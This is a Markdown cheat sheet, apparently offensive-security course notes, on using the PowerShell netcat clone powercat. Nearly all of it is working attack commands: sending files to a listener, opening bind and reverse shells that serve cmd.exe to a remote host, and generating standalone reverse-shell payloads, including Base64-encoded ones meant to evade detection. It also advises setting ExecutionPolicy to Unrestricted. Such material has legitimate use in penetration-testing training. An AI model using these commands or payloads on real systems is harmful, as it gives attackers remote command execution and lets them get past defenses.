## powercat.ps1

The PowerShell version of NetCat, written by besimorhino.

### Getting Started

Be sure to follow this process to get the powercat.ps1 script onto Windows, or it will be corrupt and not work (You'll get several errors about ampersands when you try to load the command):

1. Do not get powercat.ps1 file using wget or curl from github directly.
2. Use `apt install powercat` to create it under /usr/share/windows-resources/powercat/powercat.ps1
3. Get a hash of the script on Linux
4. Send it via netcat to Windows 
5. Start Powershell and get hash of the received script on Windows OS Powershell (i.e. Get-FileHash)
6. Set ExecutionPolicy to 'Unrestricted'

```powershell
# Load powercat (dot-sourcing) it to run the commands natively from the CLI
. .\powercat.ps1
# Help menu
powercat -h
```

### File Transfers

#### Server

```bash
sudo nc -lnvp 443 > receive_file
```

#### Client

```powershell
powercat -c 192.168.116.219 -p 443 -i c:\sendfile.txt
```

### Bind Shells

Note:  If doing this from the CLI, the process will hang due to a pause in the code waiting for input.  You can get around this by pressing any key (besides CTRL) on Windows or commenting out the code as specified [here](https://forums.offensive-security.com/showthread.php?28327-Powercat-bind-shell-doesn-t-work&p=117323#post117323). 

This issue only seems to happen when manually executing this from the CLI and should not occur if this is done as part of a payload.

#### Server

```powershell
powercat -l -p 443 -e cmd.exe -v
# Options
-v	# verbose output
```

#### Client

```bash
nc -nv 192.168.216.10 443
```

Note:  If doing this manually, the process will hang due to a pause in the code waiting for input.  You can get around this by pressing ENTER on both ends (although it doesn't always work) or commenting out the code as specified [here](https://forums.offensive-security.com/showthread.php?28327-Powercat-bind-shell-doesn-t-work&p=117323#post117323). 

This issue only seems to happen when manually executing this from the CLI and should not occur if this is done as part of a payload.

### Reverse Shell

If the shell hangs, see the note in 'Bind Shells' above.

#### Server:

```bash
sudo nc -lnvp 443
```

#### Client

```powershell
powercat -c 192.168.116.219 -p 443 -e cmd.exe -v
```

### Stand-Alone Payloads

Powercat can generate payloads which include a set of powershell instructions and a portion of the powercat script requested by the user.

Plaintext payloads have a low success rate due to their large size of code and hardcoded strings that are easily detected.

```powershell
# Plaintext payload
powercat -c 192.168.119.216 -p 443 -e cmd.exe -g > reversehell.ps1
```

This can be overcome using Base64 encoding instead.

```powershell
# Base64 payload
powercat -c 192.168.119.216 -p 443 -e cmd.exe -ge > encodedreversehell.ps1
```

An encoded shell cannot be executed from a file, it must be sent to Powershell

```powershell
powershell.exe -E A-REALLY-LONG-ENCODED-PAYLOAD
```
